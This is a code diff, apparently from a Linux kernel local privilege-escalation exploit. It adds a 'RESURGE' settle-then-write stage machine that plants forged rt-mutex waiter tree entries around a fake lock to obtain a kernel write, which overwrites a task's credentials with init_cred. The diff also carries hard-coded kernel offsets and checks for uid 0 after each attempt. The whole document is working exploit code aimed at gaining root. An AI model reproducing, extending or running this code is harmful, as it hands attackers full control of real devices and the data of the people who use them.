@@ -936,6 +936,71 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             }
           } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
+             * RESURGE (GhostLockAdapt port, 09-12): settle-then-write.
+             * Stage 1 (settle): ALL-benign stamp — tree+pi words 0,
+             * task=dead-end BSS, lock=fake_lock, prio 0. The trigger
+             * walk DEQUEUES the ghost from the stale original tree and
+             * RE-ENQUEUES it into fake_lock's (zeroed, empty) tree —
+             * consistent linkage. Stage 2 (write): the write stamp with
+             * lock rotated to fake_lock2 = bss_tail + rot*8 (fresh slot
+             * per write). This is the load-bearing sequence from
+             * poc-mcast-root (ghost_write_value + respray).
+             */
+            if (g_resurge_stage == 1) {
+              uint64_t bt_off =
+                  (active_offsets && active_offsets->off_bss_tail_lock)
+                      ? (uint64_t)active_offsets->off_bss_tail_lock
+                      : 0x02BB9D00ULL;
+              tree_pc = 0;
+              tree_r = 0;
+              tree_l = 0;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + bt_off);
+              stack_prio = 0;
+              stack_deadline = 0;
+              pr_info("stack RESURGE SETTLE: all-0 tree, task=dead_end "
+                      "lock=fake_lock prio=0 (re-link into fake tree)\n");
+              goto stack_words_done;
+            }
+            if (g_resurge_stage == 2) {
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              uint64_t ic_off =
+                  (active_offsets && active_offsets->off_init_cred)
+                      ? (uint64_t)active_offsets->off_init_cred
+                      : 0x027E0BE0ULL;
+              uint64_t val = g_cred_copy
+                                 ? (uint64_t)g_cred_copy
+                                 : (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                       ic_off);
+              uint64_t bt_off =
+                  (active_offsets && active_offsets->off_bss_tail_lock)
+                      ? (uint64_t)active_offsets->off_bss_tail_lock
+                      : 0x02BB9D00ULL;
+              /* rotate: fresh fake_lock2 slot per write (their pattern) */
+              int rot = g_resurge_rot ? g_resurge_rot : 1;
+              tree_pc = (ztgt - 8) & ~3ULL;  /* red parent, target-8 */
+              tree_r = val;                  /* child = init_cred (WRITE) */
+              tree_l = 0;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + bt_off +
+                                     (uint64_t)rot * 8);
+              stack_prio = 0;
+              stack_deadline = 0;
+              pr_info("stack RESURGE WRITE rot=%d: *%016llx = %016llx "
+                      "parent=%016llx lock2=%016llx\n",
+                      rot, (unsigned long long)ztgt,
+                      (unsigned long long)val,
+                      (unsigned long long)tree_pc,
+                      (unsigned long long)stack_lock);
+              goto stack_words_done;
+            }
+            /*
              * *task.cred = init_cred.
              * Default (09-12): park-class only-left PLAIN-STORE
              *   tree_pc=VALUE=init_cred  tree_l=TARGET=slot  tree_r=0
@@ -1830,6 +1895,22 @@ void do_pselect_fake_lock_route(void) {
       /* Each walk must change waiter prio or setattr no-ops. */
       consumer_nice = PSELECT_CONSUMER_NICE - (route_attempt - 1);
     }
+    /* RESURGE stage machine (settle-then-write, GhostLockAdapt port):
+     * attempt 1 = benign settle stamp (walk re-links ghost into the
+     * fake tree); attempts 2+ = write stamp with rotating lock slot.
+     * The fdset build below reads g_resurge_stage per attempt. */
+    if (cred_mode && env_flag("MODE4_RESURGE", 0)) {
+      if (route_attempt == 1) {
+        g_resurge_stage = 1;
+        g_resurge_rot = 0;
+        pr_info("RESURGE: stage=SETTLE (attempt 1)\n");
+      } else {
+        g_resurge_stage = 2;
+        g_resurge_rot = route_attempt - 1;
+        pr_info("RESURGE: stage=WRITE rot=%d (attempt %d)\n",
+                g_resurge_rot, route_attempt);
+      }
+    }
     if (route_attempt != 1) {
       int reuse_page =
           ((sc || vs || chain || zion || zi || wion || zio || pad3) &&
@@ -2053,6 +2134,14 @@ void do_pselect_fake_lock_route(void) {
            * reached their landing checks (08-30 fire). Same checked
            * retry here before deciding. */
           int canary = env_flag("UID0_COMM_CANARY", 0);
+          if (g_resurge_stage == 1) {
+            /* SETTLE attempt: no write expected — the trigger just
+             * re-linked the ghost into the fake tree. Skip landing
+             * checks and sweeps; next attempt carries the write. */
+            pr_info("RESURGE settle trigger done (attempt %d) — "
+                    "next attempt writes\n", route_attempt);
+            goto settle_skip;
+          }
           uint32_t cq = cred_mode ? uid0_child_getuid_query() : 9999;
           if (cred_mode)
             pr_info("%s uid query attempt=%d -> %u getuid=%u\n",
@@ -2158,7 +2247,8 @@ void do_pselect_fake_lock_route(void) {
               }
             }
           }
-        } else {
+        settle_skip:;
+          } else {
         pr_info("SWAP_NOCFI: skipping post-walk cfi probe fake_fops=%016zx\n",
                 fake_fops);
         route_verified = 1;
